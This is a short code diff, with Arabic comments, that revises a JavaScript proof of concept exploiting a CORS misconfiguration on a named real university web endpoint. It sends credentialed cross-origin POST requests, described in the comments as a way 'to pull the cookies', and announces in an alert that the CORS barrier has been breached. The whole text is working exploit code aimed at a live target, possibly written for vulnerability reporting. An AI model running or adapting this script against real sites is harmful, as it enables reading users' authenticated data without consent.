@@ -1,10 +1,17 @@
 fetch('https://iisv2.ucsiuniversity.edu.my/cdn-cgi/rum', {
-    method: 'GET',
-    credentials: 'include' // هذا السطر هو الأهم، لأنه يرسل الكوكيز حقك
+    method: 'POST', // لازم POST زي التقرير
+    mode: 'cors',
+    credentials: 'include', // عشان يسحب الكوكيز
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({"memory":{}}) // بيانات وهمية تشبه اللي في التقرير
 })
-.then(response => response.text())
+.then(response => {
+    console.log("Response Status:", response.status);
+    return response.text();
+})
 .then(data => {
-    alert('تم سحب بياناتك بنجاح عبر ثغرة CORS:\n' + data);
-    console.log(data);
+    alert("تم اختراق حاجز CORS! البيانات: " + data);
 })
-.catch(err => console.error('فشل الاستغلال:', err));
+.catch(err => console.error("للاسف لسه فيه حماية:", err));
